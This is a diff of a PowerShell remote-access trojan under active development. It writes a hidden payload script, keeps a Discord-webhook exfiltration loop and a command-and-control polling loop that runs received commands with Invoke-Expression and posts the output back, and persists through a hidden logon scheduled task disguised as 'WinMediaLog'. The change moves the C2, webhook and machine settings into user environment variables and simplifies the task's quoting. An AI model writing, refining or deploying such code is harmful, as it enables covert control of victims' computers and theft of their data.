@@ -6,9 +6,18 @@ if(!(Test-Path $d)){New-Item $d -Type Directory | Out-Null}
 $l = "$d\data.txt"
 $p = "$d\winlog.ps1"
 
-# Using single quotes prevents PowerShell from breaking the variables inside the string
+# Save execution parameters permanently to the user environment registry
+[Environment]::SetEnvironmentVariable("C2_PCNAME", $PCName, "User")
+[Environment]::SetEnvironmentVariable("C2_WEBHOOK", $WebhookUrl, "User")
+[Environment]::SetEnvironmentVariable("C2_SERVER", $C2Url, "User")
+[Environment]::SetEnvironmentVariable("C2_LOGFILE", $l, "User")
+
+# The internal script content reads clean variables directly out of the Environment space
 $scriptContent = @'
-param([string]$PCName, [string]$WebhookUrl, [string]$C2Url, [string]$l)
+$PCName     = $env:C2_PCNAME
+$WebhookUrl = $env:C2_WEBHOOK
+$C2Url      = $env:C2_SERVER
+$l          = $env:C2_LOGFILE
 
 # 1. Discord Exfiltration Loop
 Start-Job -ScriptBlock {
@@ -34,7 +43,6 @@ Start-Job -ScriptBlock {
             if($cmd -and $cmd -ne 'wait'){
                 $res = (Invoke-Expression $cmd 2>&1 | Out-String)
                 if(!$res){$res = 'Command executed with no output'}
-                # Send explicitly as a form parameter to ensure Flask reads it cleanly
                 Invoke-RestMethod -Uri "${C2Url}/send_res?id=${PCName}" -Method Post -Body @{output=$res}
             }
         } catch { Start-Sleep -s 15 }
@@ -55,12 +63,10 @@ while($true){
 }
 '@
 
-# Safely write out the operational payload script
+# Safely output the persistent operations file
 Set-Content -Path $p -Value $scriptContent
-
-# Set attributes to Hidden
 Set-ItemProperty -Path $p -Name Attributes -Value Hidden -ErrorAction SilentlyContinue
 
-# Create an unprivileged task to launch the loop hidden on user login
-schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`" -PCName `"$PCName`" -WebhookUrl `"$WebhookUrl`" -C2Url `"$C2Url`" -l `"$l`"" /sc onlogon
+# Create and run the simplified task (escaped with outer single quotes and inner double quotes)
+schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`"" /sc onlogon
 schtasks /run /tn 'WinMediaLog'
